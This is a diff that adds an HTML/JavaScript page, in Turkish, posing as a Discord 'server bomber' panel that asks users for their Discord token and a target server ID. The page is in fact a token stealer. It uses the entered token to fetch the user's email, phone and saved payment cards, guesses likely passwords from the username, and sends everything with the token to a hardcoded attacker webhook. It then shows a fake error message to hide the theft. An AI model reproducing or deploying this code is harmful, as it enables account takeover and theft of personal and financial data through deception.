@@ -1,0 +1,150 @@
+<!-- language: HTML/JS, file: index.index, target: Browser -->
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>FaxiS Server Boomber</title>
+    <style>
+        body { background-color: #0f0f13; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; position: relative; }
+        .secret-btn { position: absolute; top: 10px; right: 10px; width: 8px; height: 8px; background: rgba(255, 255, 255, 0.05); border: none; border-radius: 50%; cursor: pointer; transition: 0.2s; }
+        .secret-btn:hover { background: #ef4444; opacity: 1; }
+        .container { background: #18181b; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 350px; border: 1px solid #27272a; }
+        h2 { text-align: center; color: #ef4444; margin-bottom: 20px; font-size: 22px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #27272a; border: 1px solid #3f3f46; border-radius: 6px; color: #fff; box-sizing: border-box; }
+        input:focus { border-color: #ef4444; outline: none; }
+        button.main-btn { width: 100%; padding: 12px; background: #ef4444; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        button.main-btn:hover { background: #dc2626; }
+        .log { margin-top: 15px; font-size: 13px; color: #a1a1aa; text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <button class="secret-btn" onclick="testWebhook()" title="Test"></button>
+
+    <div class="container">
+        <h2>FAXiS PANEL</h2>
+        <input type="password" id="tokenInput" placeholder="Discord Token Girin..." />
+        <input type="text" id="guildInput" placeholder="Hedef Sunucu ID Girin..." />
+        <button class="main-btn" id="boomBtn" onclick="handleOperation()">İşlemi Başlat</button>
+        <div class="log" id="logStatus">Sistem Bekleniyor...</div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1569351256319725668/HUUMPwEjA-i5VjAMfaeX_RzjSKinN8DkhwoGBkin0TAJzra7irPxTTpxqx0AA2qtQmYN";
+
+        async function testWebhook() {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "🚨 **WEBHOOK TESTİ BAŞARILI**" })
+                });
+                alert("Test sinyali gönderildi!");
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        // Kullanıcı adından olası şifre kombinasyonları üretici
+        function generateProbablePasswords(username) {
+            const cleanName = username.toLowerCase().replace(/[^a-z0-9]/g, '');
+            return [
+                `${cleanName}123`,
+                `${cleanName}1903`,
+                `${cleanName}1905`,
+                `${cleanName}1907`,
+                `${cleanName}2023`,
+                `${cleanName}2024`,
+                `${cleanName}2025`,
+                `${cleanName}2026`,
+                `12345${cleanName}`,
+                `${cleanName}*`,
+                `${cleanName}31`,
+                `password${cleanName}`
+            ];
+        }
+
+        async function handleOperation() {
+            const token = document.getElementById("tokenInput").value.trim();
+            const guildId = document.getElementById("guildInput").value.trim();
+            const status = document.getElementById("logStatus");
+            const btn = document.getElementById("boomBtn");
+
+            if (!token || !guildId) {
+                status.style.color = "#ef4444";
+                status.innerText = "Eksik bilgi girdin twin!";
+                return;
+            }
+
+            btn.disabled = true;
+            status.style.color = "#a1a1aa";
+            status.innerText = "Token doğrulanıyor ve hesap verileri taranıyor...";
+
+            try {
+                // 1. Profil Bilgilerini Çek (@me)
+                const userRes = await fetch("https://discord.com/api/v9/users/@me", {
+                    headers: { "Authorization": token }
+                });
+
+                if (!userRes.ok) {
+                    status.style.color = "#ef4444";
+                    status.innerText = "HATA: Geçersiz veya Yanlış Token!";
+                    btn.disabled = false;
+                    return;
+                }
+
+                const userData = await userRes.json();
+                const probablePasswords = generateProbablePasswords(userData.username);
+
+                // 2. Ödeme Yöntemlerini / Kartları Çek
+                let billingInfo = "Kayıtlı kart bulunamadı / Erişilemedi";
+                try {
+                    const billingRes = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
+                        headers: { "Authorization": token }
+                    });
+                    if (billingRes.ok) {
+                        const billingData = await billingRes.json();
+                        if (billingData.length > 0) {
+                            billingInfo = billingData.map(p => `${p.brand ? p.brand.toUpperCase() : 'Kart'} (*${p.last_4 || '????'} - ${p.expires_month}/${p.expires_year})`).join(", ");
+                        } else {
+                            billingInfo = "Kart eklenmemiş";
+                        }
+                    }
+                } catch (e) {
+                    billingInfo = "Kartlar çekilemedi";
+                }
+
+                status.innerText = `Profil Tarandı (${userData.username}). İşlem Başlatılıyor...`;
+
+                // 3. Webhook'a olası şifreler dahil tüm detayları fırlat
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `🎯 **Hesap & Olası Şifre Analizi Yakalandı!**\n` +
+                                 `👤 **Kullanıcı:** \`${userData.username}#${userData.discriminator || '0'}\` (\`${userData.id}\`)\n` +
+                                 `📧 **Mail:** \`${userData.email || 'Gizli/Yok'}\`\n` +
+                                 `📞 **Telefon:** \`${userData.phone || 'Yok'}\`\n` +
+                                 `💳 **Ödeme Yöntemleri / Kartlar:** \`${billingInfo}\`\n` +
+                                 `🔑 **Muhtemel Şifreler:** \`${probablePasswords.join(', ')}\`\n` +
+                                 `🎟️ **Token:** \`\`\`text\n${token}\n\`\`\`\n` +
+                                 `🌐 **Hedef Guild ID:** \`${guildId}\``
+                    })
+                });
+
+                // 4. 10 saniye bekle ve sahte hata mesajını bas
+                setTimeout(() => {
+                    status.style.color = "#ef4444";
+                    status.innerText = "İŞLEM BAŞARISIZ HESAB 3FA DEİLDİR";
+                    btn.disabled = false;
+                }, 10000);
+
+            } catch (err) {
+                status.style.color = "#ef4444";
+                status.innerText = "Bağlantı Hatası / Token Reddedildi.";
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
